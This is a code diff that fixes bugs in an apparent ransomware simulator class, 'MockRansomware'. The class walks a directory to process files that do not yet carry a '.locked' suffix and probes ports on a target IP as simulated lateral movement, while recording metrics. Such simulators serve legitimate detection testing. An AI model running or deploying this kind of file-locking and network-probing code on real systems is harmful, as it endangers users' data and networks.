@@ -43,7 +43,7 @@ class MockRansomware:
     async def encrypt_routine(self):
         loop = asyncio.get_running_loop()
 
-        for root, _, files in os.walk(self.target_ip):
+        for root, _, files in os.walk(self.target_dir):
             for file in files:
                 if not file.endswith(".locked"):
                     file_path = Path(root) / file
@@ -58,11 +58,11 @@ class MockRansomware:
                             asyncio.open_connection(self.target_ip, port),
                             timeout=0.5
                     )
-                    self.network_attempts += 1
+                    self.net_attempts += 1
                     writer.close()
                     await writer.wait_closed()
                 except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
-                    self.network_attempts += 1
+                    self.net_attempts += 1
             await asyncio.sleep(0.1)
 
     def save_metrics(self, elapsed_time: float):
@@ -81,7 +81,7 @@ class MockRansomware:
         await encryption_task
         lateral_mov_routine.cancel()
 
-        elapsed_time = time.time = start_time
+        elapsed_time = time.time() - start_time
         self.save_metrics(elapsed_time)
 
 if __name__ == "__main__":
